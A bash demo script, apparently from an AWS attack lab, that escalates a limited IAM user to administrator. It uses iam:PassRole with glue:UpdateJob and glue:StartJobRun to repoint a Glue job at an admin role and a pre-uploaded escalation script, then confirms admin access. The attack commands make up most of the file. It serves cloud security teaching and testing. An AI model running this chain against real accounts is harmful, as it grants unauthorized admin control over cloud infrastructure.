#!/bin/bash

# Demo script for iam:PassRole + glue:UpdateJob + glue:StartJobRun privilege escalation
# This script demonstrates how a user with PassRole, UpdateJob, and StartJobRun can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-glue-005-to-admin-starting-user"
TARGET_ROLE="pl-prod-glue-005-to-admin-target-role"
INITIAL_ROLE="pl-prod-glue-005-to-admin-initial-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Glue UpdateJob + StartJobRun Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_glue_005_iam_passrole_glue_updatejob_glue_startjobrun.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify lack of admin permissions
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Retrieve pre-uploaded script locations from Terraform
echo -e "${YELLOW}Step 5: Retrieving pre-uploaded Glue job scripts from Terraform${NC}"

BENIGN_SCRIPT_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.benign_script_s3_path')
MALICIOUS_SCRIPT_PATH=$(echo "$MODULE_OUTPUT" | jq -r '.malicious_script_s3_path')
SCRIPT_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.script_bucket_name')

if [ "$BENIGN_SCRIPT_PATH" == "null" ] || [ -z "$BENIGN_SCRIPT_PATH" ]; then
    echo -e "${RED}Error: Could not retrieve script S3 paths from terraform output${NC}"
    exit 1
fi

echo "Benign script S3 path: $BENIGN_SCRIPT_PATH"
echo "Malicious script S3 path: $MALICIOUS_SCRIPT_PATH"
echo "Script bucket: $SCRIPT_BUCKET"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The Python scripts were pre-uploaded by Terraform to a bucket in this account for demonstration.${NC}"
echo -e "${BLUE}  In a real attack, the malicious script would typically be in an attacker-controlled S3 bucket${NC}"
echo -e "${BLUE}  in another account that grants public read access. The starting user can read from this bucket${NC}"
echo -e "${BLUE}  via a bucket policy (not IAM permissions), simulating access to a public attacker bucket.${NC}"
echo ""
echo -e "${GREEN}✓ Retrieved script locations from Terraform${NC}\n"

# Step 6: Get pre-created job name from Terraform
echo -e "${YELLOW}Step 6: Retrieving pre-created Glue job name from Terraform${NC}"

GLUE_JOB_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.glue_job_name')

if [ "$GLUE_JOB_NAME" == "null" ] || [ -z "$GLUE_JOB_NAME" ]; then
    echo -e "${RED}Error: Could not retrieve Glue job name from terraform output${NC}"
    exit 1
fi

echo "Pre-created job name: $GLUE_JOB_NAME"
echo -e "${GREEN}✓ Retrieved job name from Terraform${NC}\n"

# Step 7: Show current job configuration
echo -e "${YELLOW}Step 7: Showing current job configuration${NC}"
echo "Retrieving current configuration of job: $GLUE_JOB_NAME"
echo ""

JOB_INFO=$(aws glue get-job \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
    --output json 2>/dev/null)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to retrieve job information${NC}"
    exit 1
fi

CURRENT_ROLE=$(echo "$JOB_INFO" | jq -r '.Job.Role')
CURRENT_SCRIPT=$(echo "$JOB_INFO" | jq -r '.Job.Command.ScriptLocation')

echo "Current job configuration:"
echo "  Role: $CURRENT_ROLE"
echo "  Script: $CURRENT_SCRIPT"
echo ""
echo -e "${GREEN}✓ Retrieved current job configuration${NC}\n"

# Step 8: Update Glue job with admin role and malicious script
echo -e "${YELLOW}Step 8: Updating Glue job with admin role and malicious script${NC}"
echo "This is the privilege escalation vector - updating the job to use admin role..."
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Job Name: $GLUE_JOB_NAME"
echo ""

aws glue update-job \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
    --job-update "Role=${TARGET_ROLE_ARN},Command={Name=pythonshell,ScriptLocation=${MALICIOUS_SCRIPT_PATH},PythonVersion=3.9},DefaultArguments={--job-language=python},MaxCapacity=0.0625,Timeout=5" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated Glue job with admin role and malicious script!${NC}"
    echo ""
    echo "Updated job configuration:"
    echo "  Role: $TARGET_ROLE_ARN (admin role)"
    echo "  Script: $MALICIOUS_SCRIPT_PATH (escalation script)"
else
    echo -e "${RED}Error: Failed to update Glue job${NC}"
    exit 1
fi
echo ""

# Step 9: Start the Glue job run
echo -e "${YELLOW}Step 9: Starting Glue job run${NC}"
echo "Starting job: $GLUE_JOB_NAME"

JOB_RUN_OUTPUT=$(aws glue start-job-run \
    --region $AWS_REGION \
    --job-name "$GLUE_JOB_NAME" \
    --output json)

JOB_RUN_ID=$(echo "$JOB_RUN_OUTPUT" | jq -r '.JobRunId')

if [ -z "$JOB_RUN_ID" ] || [ "$JOB_RUN_ID" = "null" ]; then
    echo -e "${RED}Error: Failed to start Glue job run${NC}"
    exit 1
fi

echo "Job Run ID: $JOB_RUN_ID"
echo -e "${GREEN}✓ Job run started successfully${NC}\n"

# Step 10: Wait for job completion
echo -e "${YELLOW}Step 10: Waiting for Glue job to complete${NC}"
echo "Monitoring job status (checking every 5 seconds)..."

MAX_WAIT=300  # 5 minutes
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    JOB_STATUS=$(aws glue get-job-run \
        --region $AWS_REGION \
        --job-name "$GLUE_JOB_NAME" \
        --run-id "$JOB_RUN_ID" \
        --query 'JobRun.JobRunState' \
        --output text 2>/dev/null)

    echo "  [${ELAPSED}s] Job status: $JOB_STATUS"

    if [ "$JOB_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ Glue job completed successfully!${NC}\n"
        break
    elif [ "$JOB_STATUS" = "FAILED" ] || [ "$JOB_STATUS" = "STOPPED" ] || [ "$JOB_STATUS" = "ERROR" ]; then
        echo -e "${RED}✗ Glue job failed with status: $JOB_STATUS${NC}"
        echo "Fetching error details..."
        aws glue get-job-run \
            --region $AWS_REGION \
            --job-name "$GLUE_JOB_NAME" \
            --run-id "$JOB_RUN_ID" \
            --query 'JobRun.ErrorMessage' \
            --output text
        exit 1
    fi

    sleep 5
    ELAPSED=$((ELAPSED + 5))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}✗ Timeout: Job did not complete within expected time${NC}"
    exit 1
fi

# Step 11: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 11: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take up to 15 seconds to be effective..."
sleep 15
echo -e "${GREEN}✓ Policy propagation complete${NC}\n"

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Retrieved pre-created Glue job: $GLUE_JOB_NAME"
echo "3. Showed current job configuration (initial role and benign script)"
echo "4. Updated Glue job to use admin role: $TARGET_ROLE"
echo "5. Updated Glue job script to malicious escalation script"
echo "6. Started Glue job run which executed the malicious Python script"
echo "7. Script attached AdministratorAccess to starting user"
echo "8. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (iam:PassRole + glue:UpdateJob)"
echo -e "  → Update existing Glue Job with $TARGET_ROLE and malicious script"
echo -e "  → (glue:StartJobRun) → Execute Python Script"
echo -e "  → (iam:AttachUserPolicy) → Admin Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Glue Job: $GLUE_JOB_NAME (now using admin role and malicious script)"
echo "- Policy Attachment: AdministratorAccess on $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The following resources need restoration:${NC}"
echo -e "${RED}  - Glue job configuration has been modified${NC}"
echo -e "${RED}  - AdministratorAccess policy attached to starting user${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
